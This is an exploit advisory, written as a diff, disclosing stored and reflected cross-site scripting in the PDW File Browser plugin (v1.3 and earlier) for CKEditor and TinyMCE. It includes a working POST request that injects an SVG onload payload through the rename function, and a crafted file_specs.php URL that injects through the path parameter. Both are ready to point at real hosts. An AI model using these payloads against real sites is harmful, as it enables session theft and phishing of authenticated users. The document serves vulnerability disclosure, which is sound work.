@@ -1,0 +1,31 @@
+# Exploit Title: PDW File Browser <= v1.3 - Cross-Site Scripting (XSS)
+# Date: 24-10-2020
+# Exploit Author: David Bimmel
+# Researchers: David Bimmel, Joost Vondeling, Ramòn Janssen
+# Vendor Homepage: n/a
+# Software Link: https://github.com/GuidoNeele/PDW-File-Browser
+# Version: <=1.3
+
+The PDW File Browser is a plugin for the TinyMCE and CKEditor WYSIWYG editors. The PDW File Browser contains a stored and Reflected XSS vulnerability which results in code execution within the browser of an authenticated user. This vulnerability can be exploited when an authenticated user visits the crafted URL (i.e. when phished or when visiting a website containing the URL).
+
+Stored XSS:
+The stored XSS is a result of insufficient input sanitization within the 'rename' functionality within the PDW file browser. 
+Below I have provided an example request were the filename (FILE.txt) is replaced with an XSS payload (<svg onload=alert(document.cookies)>). The payload gets executed when any authenticated user navigates to the PDW File browser page.
+
+POST /ckeditor/plugins/pdw_file_browser/actions.php
+HTTP/1.1 Host: <HOSTNAME>
+[…]
+action=rename&new_filename=<svg+onload=alert(document.cookie
+s)>&old_filename=script%253EFILE.txt&folder=%252Fmedia%252F&typ
+e=file
+
+Reflected XSS:
+The Reflected XSS is a result of insufficient input sanitization of the 'path' parameter when fetching the file specifications (file_specs.php). Below I have provided an example URL. When using this URL the user navigates to an non-existing file (the XSS payload). This results in the execution of the payload.
+
+https://<HOSTNAME>/ckeditor/plugins/pdw_file_browser/file_spe
+cs.php?ajax=true&path=%3Csvg+onload=alert(document.cookies)%
+3E&type=file
+
+
+
+Happy Hacking :^)
